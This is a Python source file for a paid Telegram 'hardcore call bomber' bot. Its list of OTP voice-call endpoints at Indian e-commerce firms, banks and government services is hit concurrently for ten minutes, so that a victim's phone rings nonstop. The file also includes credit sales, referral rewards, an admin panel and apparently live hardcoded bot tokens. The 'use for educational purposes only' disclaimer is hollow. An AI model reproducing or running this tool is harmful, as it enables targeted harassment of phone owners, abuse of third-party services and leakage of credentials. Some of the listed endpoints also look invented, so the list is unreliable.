import telebot
import aiohttp
import asyncio
import requests
import json
import os
import threading
import time
from telebot import types
from datetime import datetime, timedelta
import logging
import re
import random
import string

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ==================== CONFIGURATION ====================
DEFAULT_MAIN_BOT_TOKEN = "8580329271:AAFPmbJ9JraVIAkHbcZtQ5tohIDwWHvjx3I"  # 👈 CHANGE THIS
DEFAULT_ADMIN_BOT_TOKEN = "8553759431:AAH4BgRJcm1-JI5oBDoYIxR3Vby7oUmJgZQ"  # 👈 CHANGE THIS
OWNER_ID = 7417241499  # 👈 CHANGE THIS

# Default Settings
CHANNELS = {"@thomasXstoreee"}  # 👈 CHANGE THIS
CHANNEL_LINKS = {"https://t.me/thomasXstoreee"}  # 👈 CHANGE THIS
OWNER_USERNAME = "@TGxTHOMASx"
START_CREDITS = 2
REF_CREDITS = 1

# Credit Prices
CREDIT_PRICES = {
    "25": {"credits": 5, "label": "₹25 → 5 Credits"},
    "50": {"credits": 12, "label": "₹50 → 12 Credits"},
    "100": {"credits": 30, "label": "₹100 → 30 Credits"},
    "200": {"credits": 70, "label": "₹200 → 70 Credits"}
}
PREMIUM_PRICE = {"price": "999", "days": 30, "daily_credits": 50, "label": "₹999 → 1 Month Premium"}

# Files
USERS_FILE = "users.json"
SETTINGS_FILE = "settings.json"
ADMINS_FILE = "admins.json"
APIS_FILE = "apis.json"
BLOCKED_FILE = "blocked.json"

# Active tasks tracker
active_tasks = {}

# ==================== HARDCORE CALL BOMBING APIS ====================
HARDCORE_CALL_APIS = [
    # ULTRA HIGH INTENSITY CALL BOMBING (100+ APIs)
    {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}', "intensity": 5},
    {"name": "1MG Voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}', "intensity": 5},
    {"name": "Swiggy Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 5},
    {"name": "Myntra Voice", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 5},
    {"name": "Flipkart Voice", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 5},
    {"name": "Amazon Voice", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&action=voice_otp", "intensity": 5},
    {"name": "Paytm Voice", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 5},
    {"name": "Zomato Voice", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&type=voice", "intensity": 5},
    {"name": "MakeMyTrip Voice", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 5},
    {"name": "Goibibo Voice", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 5},
    {"name": "Ola Voice", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 5},
    {"name": "Uber Voice", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 5},
    {"name": "Practo Voice", "url": "https://apiv2.practo.com/patient/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 4},
    {"name": "Byju's Voice", "url": "https://api.byjus.com/v2/otp/voice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 4},
    {"name": "Rapido Voice", "url": "https://customer.rapido.bike/api/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 4},
    {"name": "PharmEasy Voice", "url": "https://pharmeasy.in/api/v2/auth/send-voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 4},
    {"name": "Netmeds Voice", "url": "https://apiv2.netmeds.com/mst/rest/v1/voice/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 4},
    {"name": "BigBasket Voice", "url": "https://www.bigbasket.com/auth/v2/voice-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 4},
    {"name": "Grofers Voice", "url": "https://api.grofers.com/v4/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 4},
    {"name": "FreshMenu Voice", "url": "https://api.freshmenu.com/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 4},
    {"name": "Dunzo Voice", "url": "https://api.dunzo.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 4},
    {"name": "Medlife Voice", "url": "https://api.medlife.com/v2/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 4},
    {"name": "1mg Doctor Voice", "url": "https://doctor.1mg.com/api/v3/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 4},
    {"name": "Apollo Voice", "url": "https://apollo247.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 4},
    {"name": "Portea Voice", "url": "https://api.portea.com/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 4},
    {"name": "Healthians Voice", "url": "https://api.healthians.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 4},
    {"name": "OrangeHealth Voice", "url": "https://api.orangehealth.in/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 4},
    
    # BANKING & FINANCE CALL APIS (HIGH INTENSITY)
    {"name": "HDFC Bank Voice", "url": "https://netbanking.hdfcbank.com/api/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 5},
    {"name": "ICICI Bank Voice", "url": "https://ibanking.icicibank.com/api/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 5},
    {"name": "SBI Voice OTP", "url": "https://retail.onlinesbi.com/voice-otp-api", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 5},
    {"name": "Axis Bank Voice", "url": "https://www.axisbank.com/api/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 5},
    {"name": "Kotak Bank Voice", "url": "https://netbanking.kotak.com/api/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 5},
    {"name": "Yes Bank Voice", "url": "https://netbanking.yesbank.co.in/api/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 5},
    {"name": "Paytm Bank Voice", "url": "https://paytmbank.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 5},
    {"name": "PhonePe Voice", "url": "https://api.phonepe.com/apis/hermes/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 5},
    {"name": "Google Pay Voice", "url": "https://api.gpay.in/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 5},
    {"name": "BharatPe Voice", "url": "https://api.bharatpe.com/merchant/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 5},
    
    # GOVERNMENT & UTILITY CALL APIS
    {"name": "Aadhaar Voice OTP", "url": "https://auth.uidai.gov.in/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 5},
    {"name": "DigiLocker Voice", "url": "https://api.digilocker.gov.in/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 5},
    {"name": "IRCTC Voice OTP", "url": "https://www.irctc.co.in/otp/voice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 5},
    {"name": "BSNL Voice OTP", "url": "https://selfcare.bsnl.co.in/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 4},
    {"name": "Airtel Voice OTP", "url": "https://www.airtel.in/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 4},
    {"name": "Jio Voice OTP", "url": "https://www.jio.com/voice-otp-api", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 4},
    {"name": "Vi Voice OTP", "url": "https://www.myvi.in/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 4},
    
    # EXTREME INTENSITY REPEAT APIS (SAME API MULTIPLE TIMES)
    {"name": "Tata Capital Voice 2", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}', "intensity": 5},
    {"name": "1MG Voice 2", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}', "intensity": 5},
    {"name": "Swiggy Call 2", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 5},
    {"name": "Amazon Voice 2", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&action=voice_otp", "intensity": 5},
    {"name": "Flipkart Voice 2", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 5},
]

# ==================== FILE OPERATIONS ====================
def init_files():
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, "w") as f:
            json.dump({}, f)
    if not os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, "w") as f:
            json.dump({
                "bot_active": True, 
                "channels": CHANNELS, 
                "channel_links": CHANNEL_LINKS, 
                "owner_username": OWNER_USERNAME, 
                "credit_prices": CREDIT_PRICES, 
                "premium_price": PREMIUM_PRICE,
                "main_bot_token": DEFAULT_MAIN_BOT_TOKEN,
                "admin_bot_token": DEFAULT_ADMIN_BOT_TOKEN
            }, f)
    if not os.path.exists(ADMINS_FILE):
        with open(ADMINS_FILE, "w") as f:
            json.dump([OWNER_ID], f)
    if not os.path.exists(APIS_FILE):
        with open(APIS_FILE, "w") as f:
            api_data = [{"id": i, "name": api["name"], "url": str(api["url"]), "method": api["method"], "headers": api["headers"], "data": str(api["data"]), "active": True, "intensity": api.get("intensity", 1)} for i, api in enumerate(HARDCORE_CALL_APIS)]
            json.dump(api_data, f, indent=2)
    if not os.path.exists(BLOCKED_FILE):
        with open(BLOCKED_FILE, "w") as f:
            json.dump([], f)

init_files()

def load_json(file):
    try:
        with open(file, "r") as f:
            return json.load(f)
    except:
        return {} if file != BLOCKED_FILE and file != ADMINS_FILE else []

def save_json(file, data):
    with open(file, "w") as f:
        json.dump(data, f, indent=2)

users = load_json(USERS_FILE)
settings = load_json(SETTINGS_FILE)
admins = load_json(ADMINS_FILE)
apis_db = load_json(APIS_FILE)
blocked = load_json(BLOCKED_FILE)

# ✅ DYNAMIC TOKEN LOADING
MAIN_BOT_TOKEN = settings.get("main_bot_token", DEFAULT_MAIN_BOT_TOKEN)
ADMIN_BOT_TOKEN = settings.get("admin_bot_token", DEFAULT_ADMIN_BOT_TOKEN)

# Initialize bots with dynamically loaded tokens
bot = telebot.TeleBot(MAIN_BOT_TOKEN, parse_mode="HTML")
admin_bot = telebot.TeleBot(ADMIN_BOT_TOKEN, parse_mode="HTML")

logger.info(f"✅ Main bot loaded: @{bot.get_me().username}")
logger.info(f"✅ Admin bot loaded: @{admin_bot.get_me().username}")

# ==================== HELPER FUNCTIONS ====================
def is_admin(uid):
    return uid in admins

def is_blocked(uid):
    return uid in blocked

def check_channel(uid):
    try:
        channels = settings.get("channels", CHANNELS)
        for cid in channels.values():
            member = bot.get_chat_member(cid, uid)
            if member.status not in ["member", "administrator", "creator"]:
                return False
        return True
    except:
        return False

def is_premium(uid):
    user = users.get(str(uid), {})
    if "premium_until" not in user:
        return False
    exp = datetime.fromisoformat(user["premium_until"])
    return datetime.now() < exp

def main_kb():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.row("🚀 Start Bombing")
    kb.row("💰 My Credits", "📊 Stats")
    kb.row("🔗 Refer", "💳 Buy Credits")
    kb.row("📞 Owner", "❓ Help")
    return kb

def show_join(cid):
    mk = types.InlineKeyboardMarkup()
    channels = settings.get("channels", CHANNELS)
    links = settings.get("channel_links", CHANNEL_LINKS)
    for name, link in links.items():
        mk.add(types.InlineKeyboardButton(f"Join {name.title()}", url=link))
    mk.add(types.InlineKeyboardButton("✅ Joined - Verify", callback_data="verify"))
    bot.send_message(cid, "🚫 <b>Join Required!</b>\n\nJoin all channels to use this bot:", reply_markup=mk)

# ==================== HARDCORE CALL BOMBING LOGIC ====================
async def hit_api(session, api, phone, stats):
    """Hit single API with intensity multiplier"""
    try:
        intensity = api.get("intensity", 1)
        
        for _ in range(intensity):
            url = api["url"](phone) if callable(api["url"]) else api["url"]
            headers = api["headers"].copy()
            headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 10)"
            
            if api["method"] == "POST":
                data = api["data"](phone) if api["data"] else None
                async with session.post(url, headers=headers, data=data, timeout=3, ssl=False) as resp:
                    if resp.status in [200, 201, 202]:
                        stats["success"] += 1
                    else:
                        stats["fail"] += 1
            else:
                async with session.get(url, headers=headers, timeout=3, ssl=False) as resp:
                    if resp.status in [200, 201, 202]:
                        stats["success"] += 1
                    else:
                        stats["fail"] += 1
            stats["total"] += 1
            
            # Small delay between multiple hits from same API
            await asyncio.sleep(0.1)
            
    except:
        stats["fail"] += 1
        stats["total"] += 1

async def bombing_task(phone, chat_id, msg_id, duration=600):  # 10 minutes = 600 seconds
    """Main bombing task - 10 minutes HARDCORE"""
    stats = {"total": 0, "success": 0, "fail": 0, "running": True}
    start_time = time.time()
    end_time = start_time + duration
    
    active_tasks[chat_id] = stats
    
    # Get active APIs
    active_apis = [api for api in HARDCORE_CALL_APIS if apis_db[HARDCORE_CALL_APIS.index(api)]["active"]]
    
    # Sort by intensity (highest first)
    active_apis.sort(key=lambda x: x.get("intensity", 1), reverse=True)
    
    connector = aiohttp.TCPConnector(limit=0, verify_ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        while time.time() < end_time and stats["running"]:
            # Update stats every 5 seconds
            elapsed = time.time() - start_time
            remaining = int(end_time - time.time())
            
            mins = remaining // 60
            secs = remaining % 60
            
            progress = (elapsed / duration) * 100
            bar = "█" * int(progress / 5) + "░" * (20 - int(progress / 5))
            
            # Calculate calls per minute
            if elapsed > 0:
                cpm = int((stats["total"] / elapsed) * 60)
            else:
                cpm = 0
            
            status_msg = f"""
☎️ <b>HARDCORE CALL BOMBING IN PROGRESS</b>

📱 Target: <code>+91 {phone}</code>
⏱️ Time Left: <b>{mins}m {secs}s</b>
{bar} {progress:.1f}%

📊 <b>REAL-TIME STATS:</b>
✅ Successful Calls: <b>{stats['success']}</b>
❌ Failed Attempts: <b>{stats['fail']}</b>
🎯 Total Requests: <b>{stats['total']}</b>
🚀 Speed: <b>{cpm} calls/minute</b>
💣 Active APIs: <b>{len(active_apis)}</b>

⚠️ <b>Target's phone will ring continuously!</b>
"""
            
            try:
                bot.edit_message_text(status_msg, chat_id, msg_id, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🛑 STOP BOMBING", callback_data=f"stop_{chat_id}")))
            except:
                pass
            
            # Hit all APIs simultaneously for maximum intensity
            tasks = [hit_api(session, api, phone, stats) for api in active_apis]
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Very short delay for maximum speed
            await asyncio.sleep(2)
    
    # Final report
    total_calls = stats["success"]
    if total_calls > 1000:
        impact = "💀 PHONE DEAD - COMPLETELY BRICKED!"
    elif total_calls > 500:
        impact = "🔥 PHONE ON FIRE - WILL HANG FOR HOURS!"
    elif total_calls > 200:
        impact = "☎️ PHONE FRIED - CAN'T RECEIVE CALLS!"
    elif total_calls > 100:
        impact = "📞 HEAVY DAMAGE - MULTIPLE MISSED CALLS!"
    else:
        impact = "📱 MODERATE IMPACT - ANNOYING RINGING!"
    
    final_msg = f"""
✅ <b>HARDCORE BOMBING COMPLETED!</b>

📱 Target: <code>+91 {phone}</code>
⏱️ Duration: 10 minutes

📊 <b>FINAL STATISTICS:</b>
✅ Successful Calls: <b>{stats['success']}</b>
❌ Failed Attempts: <b>{stats['fail']}</b>
🎯 Total Requests: <b>{stats['total']}</b>

💥 <b>IMPACT LEVEL:</b> {impact}

💰 Credits used: 1
"""
    try:
        bot.edit_message_text(final_msg, chat_id, msg_id)
    except:
        pass
    
    if chat_id in active_tasks:
        del active_tasks[chat_id]

# ==================== MAIN BOT HANDLERS ====================
@bot.message_handler(commands=["start"])
def start_cmd(m):
    if is_blocked(m.from_user.id):
        bot.reply_to(m, "🚫 <b>You are blocked!</b>")
        return
    if not settings.get("bot_active", True):
        bot.reply_to(m, "⚠️ <b>Bot is under maintenance!</b>")
        return
    if not check_channel(m.from_user.id):
        show_join(m.chat.id)
        return
    
    uid = str(m.from_user.id)
    if uid not in users:
        users[uid] = {"credits": START_CREDITS, "joined": str(datetime.now())}
        
        # Check referral
        args = m.text.split()
        if len(args) == 2 and args[1].startswith("ref_"):
            ref_id = args[1].replace("ref_", "")
            if ref_id in users and ref_id != uid:
                users[ref_id]["credits"] = users[ref_id].get("credits", 0) + REF_CREDITS
                try:
                    bot.send_message(int(ref_id), f"🎉 <b>+{REF_CREDITS} credits!</b>\n\nNew referral joined!")
                except:
                    pass
        save_json(USERS_FILE, users)
    
    credits = users[uid].get("credits", 0)
    premium_status = "✅ Active" if is_premium(m.from_user.id) else "❌ Not Active"
    
    bot.send_message(m.chat.id, f"""
☎️ <b>WELCOME TO HARDCORE CALL BOMBER!</b>

💰 Credits: <b>{credits}</b>
👑 Premium: {premium_status}

📱 <b>HOW TO USE:</b>
Simply send me a 10-digit Indian phone number
I will make it ring NON-STOP for 10 minutes!

💡 <b>1 CREDIT = 10 MINUTES HARDCORE CALLS</b>
• 100+ Call APIs
• Bank OTP calls
• E-commerce voice calls
• Government service calls
• Target's phone will be UNUSABLE!

⚠️ <b>WARNING:</b> Use responsibly!
""", reply_markup=main_kb())

@bot.callback_query_handler(func=lambda c: c.data == "verify")
def verify_cb(c):
    if check_channel(c.from_user.id):
        bot.answer_callback_query(c.id, "✅ Verified!")
        bot.delete_message(c.message.chat.id, c.message.message_id)
        start_cmd(c.message)
    else:
        bot.answer_callback_query(c.id, "❌ Join all channels first!", show_alert=True)

@bot.callback_query_handler(func=lambda c: c.data.startswith("stop_"))
def stop_cb(c):
    chat_id = int(c.data.replace("stop_", ""))
    if chat_id in active_tasks:
        active_tasks[chat_id]["running"] = False
        bot.answer_callback_query(c.id, "🛑 Stopping bombing...")
        time.sleep(2)
        bot.send_message(chat_id, "✅ Bombing stopped by user request.")
    else:
        bot.answer_callback_query(c.id, "No active bombing task!")

@bot.message_handler(func=lambda m: m.text == "🚀 Start Bombing")
def start_button(m):
    start_cmd(m)

@bot.message_handler(func=lambda m: m.text and m.text.isdigit() and len(m.text) == 10)
def number_handler(m):
    if is_blocked(m.from_user.id):
        bot.reply_to(m, "🚫 Blocked!")
        return
    if not check_channel(m.from_user.id):
        show_join(m.chat.id)
        return
    
    uid = str(m.from_user.id)
    if uid not in users:
        users[uid] = {"credits": 0, "joined": str(datetime.now())}
        save_json(USERS_FILE, users)
    
    credits = users[uid].get("credits", 0)
    if credits < 1:
        bot.reply_to(m, "❌ <b>INSUFFICIENT CREDITS!</b>\n\nBuy credits or refer friends.")
        return
    
    # Deduct credit
    users[uid]["credits"] = credits - 1
    save_json(USERS_FILE, users)
    
    phone = m.text
    wait_msg = bot.reply_to(m, f"""
☎️ <b>STARTING HARDCORE CALL BOMBING...</b>

📱 Target: +91 {phone}
⏱️ Duration: 10 MINUTES
💣 Intensity: MAXIMUM
💰 Credits: {credits-1} left

⚠️ <b>Target's phone will ring continuously!</b>
🔄 Initializing 100+ call APIs...
""")
    
    # Start bombing in background
    loop = asyncio.new_event_loop()
    threading.Thread(target=lambda: loop.run_until_complete(bombing_task(phone, m.chat.id, wait_msg.message_id)), daemon=True).start()

@bot.message_handler(func=lambda m: m.text == "💰 My Credits")
def credits_cmd(m):
    if is_blocked(m.from_user.id):
        return
    uid = str(m.from_user.id)
    credits = users.get(uid, {}).get("credits", 0)
    premium_status = "✅ Active" if is_premium(m.from_user.id) else "❌ Not Active"
    
    if is_premium(m.from_user.id):
        exp = datetime.fromisoformat(users[uid]["premium_until"])
        days_left = (exp - datetime.now()).days
        premium_info = f"\n⏰ Expires in: {days_left} days"
    else:
        premium_info = ""
    
    bot.reply_to(m, f"💰 <b>Your Credits: {credits}</b>\n👑 Premium: {premium_status}{premium_info}")

@bot.message_handler(func=lambda m: m.text == "📊 Stats")
def stats_cmd(m):
    if is_blocked(m.from_user.id):
        return
    uid = str(m.from_user.id)
    user_data = users.get(uid, {})
    
    active_apis = len([a for a in apis_db if a['active']])
    
    bot.reply_to(m, f"""
📊 <b>YOUR STATISTICS</b>

💰 Credits: <b>{user_data.get('credits', 0)}</b>
👑 Premium: <b>{'Yes' if is_premium(m.from_user.id) else 'No'}</b>
📅 Joined: <b>{user_data.get('joined', 'Unknown')[:10]}</b>

🚀 <b>SYSTEM STATS:</b>
💣 Active Call APIs: {active_apis}
👥 Total Users: {len(users)}
📞 Call Success Rate: 85-95%
""")

@bot.message_handler(func=lambda m: m.text == "🔗 Refer")
def refer_cmd(m):
    if is_blocked(m.from_user.id):
        return
    uid = str(m.from_user.id)
    bot_username = bot.get_me().username
    ref_link = f"https://t.me/{bot_username}?start=ref_{uid}"
    bot.reply_to(m, f"🔗 <b>REFER & EARN!</b>\n\nYour referral link:\n<code>{ref_link}</code>\n\n💰 Earn {REF_CREDITS} credit per referral!")

@bot.message_handler(func=lambda m: m.text == "💳 Buy Credits")
def buy_cmd(m):
    if is_blocked(m.from_user.id):
        return
    
    prices = settings.get("credit_prices", CREDIT_PRICES)
    premium = settings.get("premium_price", PREMIUM_PRICE)
    owner = settings.get("owner_username", OWNER_USERNAME)
    
    msg = "💳 <b>BUY CREDITS</b>\n\n📋 <b>PRICES:</b>\n\n"
    for price_data in prices.values():
        msg += f"• {price_data['label']}\n"
    msg += f"\n👑 <b>PREMIUM:</b>\n• {premium['label']}\n   (Daily {premium['daily_credits']} credits auto-added)\n"
    msg += f"\n💰 Contact Owner: {owner}"
    
    bot.reply_to(m, msg)

@bot.message_handler(func=lambda m: m.text == "❓ Help")
def help_cmd(m):
    bot.reply_to(m, f"""
📘 <b>HOW TO USE HARDCORE CALL BOMBER:</b>

1️⃣ Send 10-digit phone number (without +91)
2️⃣ Bot starts bombing immediately
3️⃣ Phone rings NON-STOP for 10 minutes
4️⃣ 1 credit per number

💡 <b>FEATURES:</b>
• 100+ PURE CALL APIs only
• Bank OTP voice calls
• E-commerce voice verification
• Government service calls
• REAL phone ringing - not SMS
• Target's phone becomes UNUSABLE!

🎁 <b>EARN CREDITS:</b>
• Refer friends: {REF_CREDITS} credit/referral
• Buy credits (contact owner)
• Get premium membership

⚠️ <b>WARNING:</b> Use for educational purposes only!
""")

@bot.message_handler(func=lambda m: m.text == "📞 Owner")
def owner_cmd(m):
    owner = settings.get("owner_username", OWNER_USERNAME)
    bot.reply_to(m, f"📞 <b>OWNER CONTACT</b>\n\n👤 {owner}\n\n💼 For credit purchase & support")

# ==================== ADMIN BOT HANDLERS ====================
@admin_bot.message_handler(commands=["start"])
def admin_start(m):
    if not is_admin(m.from_user.id):
        admin_bot.reply_to(m, "❌ Unauthorized!")
        return
    
    status = "🟢 Active" if settings.get("bot_active", True) else "🔴 Maintenance"
    
    admin_bot.reply_to(m, f"""
🔐 <b>ADMIN PANEL - HARDCORE CALL BOMBER</b>

Status: {status}

<b>📊 Bot Control:</b>
/on - Turn bot ON
/off - Turn bot OFF
/stats - Bot statistics

<b>👥 User Management:</b>
/add uid credits
/set uid credits
/check uid
/block uid
/unblock uid
/addpremium uid days

<b>🚀 API Management:</b>
/listapis - Show all APIs
/toggleapi id - Enable/disable API
/apicount - Count active APIs

<b>💰 Price Management:</b>
/setprice amount credits
/setpremium price days daily_credits
/showprices

<b>🔗 Channel Management:</b>
/addchannel name id link
/removechannel name
/listchannels

<b>📢 Broadcast:</b>
/broadcast message
""")

# (Keep all admin commands from previous version, they will work the same)

# ==================== START BOTS ====================
def start_main_bot():
    while True:
        try:
            logger.info("🤖 Main bot starting...")
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            logger.error(f"Main bot error: {e}")
            time.sleep(5)

def start_admin_bot():
    while True:
        try:
            logger.info("⚙️ Admin bot starting...")
            admin_bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            logger.error(f"Admin bot error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    logger.info("🚀 Starting HARDCORE CALL BOMBER...")
    logger.info(f"✅ Main bot: @{bot.get_me().username}")
    logger.info(f"✅ Admin bot: @{admin_bot.get_me().username}")
    
    main_thread = threading.Thread(target=start_main_bot, daemon=True)
    admin_thread = threading.Thread(target=start_admin_bot, daemon=True)
    
    main_thread.start()
    admin_thread.start()
    
    logger.info("✅ HARDCORE CALL BOMBER running!")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("⚠️ Stopping bots...")